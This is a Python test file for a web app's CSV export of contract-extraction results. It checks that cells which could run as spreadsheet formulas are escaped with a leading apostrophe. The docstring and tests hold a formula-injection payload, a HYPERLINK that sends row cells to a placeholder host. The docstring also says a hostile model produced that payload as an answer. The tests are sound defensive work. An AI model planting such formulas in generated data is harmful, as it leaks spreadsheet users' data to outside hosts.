"""The batch's values.csv opens in a spreadsheet as the text it holds (stress test, 2026-10-30, hostile-model 3).

All eight columns were written raw. Three carry text no one here chose: the value (the model's conclusion), the
citation (a contract's heading) and the document (a corpus file name). A conclusion of '=HYPERLINK("https://...?leak="
&A2&B2,"Open the clause")' opened in Excel as a live link that sends the row's cells away, and a heading alone planted
one with no model involved. Every cell now goes through one escape: a cell that a spreadsheet would read as a formula
(its first character after any leading whitespace is = + - @, or it starts with a tab or a carriage return) is written
with a leading apostrophe, which Excel shows. GET /api/batches/{id} is the exact-value interface.
"""

from __future__ import annotations

import csv
import io

import pytest
from fastapi.testclient import TestClient
from hypothesis import given
from hypothesis import strategies as st

from app.api import batches
from app.api.batches import spreadsheet_cell
from app.schemas import BatchField, BatchOut, BatchRow, BatchValue

LEADS = ["=", "+", "-", "@", "\t", "\r", " =", "\u00a0=", "\n+"]


def _report(document: str, value: str, citation: str, field_key: str = "law") -> BatchOut:
    return BatchOut(
        id="b1",
        task="core-fields",
        corpus="corpus",
        model="fake-1",
        concurrency=1,
        documents=1,
        requested=1,
        started_at="2026-10-30T00:00:00Z",
        fields=[BatchField(key=field_key, label="Law", question="Which law governs?")],
        rows=[
            BatchRow(
                document_id="d1",
                document_name=document,
                values={field_key: BatchValue(run_id="r1", outcome="answered", value=value, status="pass", citation=citation, method="exact")},
            )
        ],
    )


def _cells(client: TestClient, monkeypatch: pytest.MonkeyPatch, out: BatchOut) -> list[list[str]]:
    monkeypatch.setattr(batches, "report", lambda session, batch_id: out)
    response = client.get("/api/batches/b1/values.csv")
    assert response.status_code == 200
    return list(csv.reader(io.StringIO(response.text)))


def _executable(cell: str) -> bool:
    return cell[:1] in ("\t", "\r") or cell.lstrip(" \u00a0\t\r\n")[:1] in ("=", "+", "-", "@")


@pytest.mark.parametrize("lead", LEADS)
@pytest.mark.parametrize("column", ["document", "value", "citation", "field"])
def test_no_cell_a_spreadsheet_would_evaluate_leaves_the_writer(client: TestClient, monkeypatch: pytest.MonkeyPatch, lead: str, column: str) -> None:
    hostile = f'{lead}HYPERLINK("https://example.invalid/?leak="&A2&B2,"Open the clause")'
    parts = {"document": "alpha.txt", "value": "Delaware law", "citation": "§3", "field": "law"} | {column: hostile}
    rows = _cells(client, monkeypatch, _report(parts["document"], parts["value"], parts["citation"], parts["field"]))
    assert all(not _executable(cell) for row in rows for cell in row), rows
    assert any(cell == "'" + hostile for row in rows for cell in row), "the text is kept, behind the apostrophe"


def test_control_ordinary_cells_are_written_as_they_are(client: TestClient, monkeypatch: pytest.MonkeyPatch) -> None:
    rows = _cells(client, monkeypatch, _report("alpha.txt", "The laws of the State of Delaware govern.", "§3 Governing Law"))
    assert rows[0] == ["document", "field", "outcome", "value", "status", "citation", "method", "run_id"]
    assert rows[1] == ["alpha.txt", "law", "answered", "The laws of the State of Delaware govern.", "pass", "§3 Governing Law", "exact", "r1"]


def test_a_signed_amount_opens_as_its_text_with_the_escape_shown() -> None:
    # Excel shows the apostrophe of a CSV it opens: "'-$5M" reads '-$5M (the skeptic's oracle, Excel 16).
    assert spreadsheet_cell("-$5M per claim is the cap.") == "'-$5M per claim is the cap."


@given(st.text(max_size=40), st.sampled_from(LEADS))
def test_whatever_follows_a_lead_the_cell_is_not_executable(rest: str, lead: str) -> None:
    assert not _executable(spreadsheet_cell(lead + rest))


@given(st.text(max_size=40))
def test_a_cell_is_only_ever_prefixed(text: str) -> None:
    escaped = spreadsheet_cell(text)
    assert escaped in (text, "'" + text)
